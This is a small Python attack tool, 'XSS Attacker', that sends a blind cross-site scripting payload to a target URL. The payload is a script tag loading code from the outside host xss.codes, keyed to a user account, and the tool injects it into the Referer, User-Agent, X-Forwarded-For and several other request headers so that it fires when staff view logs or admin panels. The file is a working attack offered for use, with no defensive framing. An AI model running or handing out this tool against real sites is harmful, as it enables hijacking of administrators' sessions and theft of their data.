#!/usr/bin/python3


#/
#   Codder : 0x0fy
#   twitter.com/0x00fy
#\

import requests,argparse,os

parser = argparse.ArgumentParser(description="XSS Attacker By : 0x00fy")
parser.add_argument('-t', '--target', help='Target URL')
parser.add_argument('-u', '--user', help='XSS.CODES Username')

args = parser.parse_args()

def Clear():
    if os.name == "nt":
	os.system("cls")
    else:
	os.system("clear")

    
def Helprr():
    parser.print_help()
    exit(1)


def Sakso():
    Clear()
    print("""
__  ______ ____   ____ ___  ____  _____ ____  
\ \/ / ___/ ___| / ___/ _ \|  _ \| ____/ ___| 
 \  /\___ \___ \| |  | | | | | | |  _| \___ \ 
 /  \ ___) |__) | |__| |_| | |_| | |___ ___) |
/_/\_\____/____(_)____\___/|____/|_____|____/ 
  
""")

def Attack(target,user):
    payload = "'><sCriPt sRC=https://xss.codes/s/" + user + "></sCRiPT>"
    s = requests.Session()
    s.headers.update({'referer': payload})
    s.headers.update({'x-forwarded-for': payload})
    s.headers.update({'x-originating-ip': payload})
    s.headers.update({'x-remote-ip': payload})
    s.headers.update({'x-remote-adrr': payload})
    s.headers.update({'user-agent': payload})
    s.get(target)
    Sakso()
    print ("[+] Payloads Have a been sended..")
    print ("")
    exit(1)



def main():
    try:
        target = args.target
        user = args.user
        Attack(target,user)

    except Exception as e:
        Sakso()
        Helprr()
        print(e)

if __name__ == '__main__':
    exit(main())
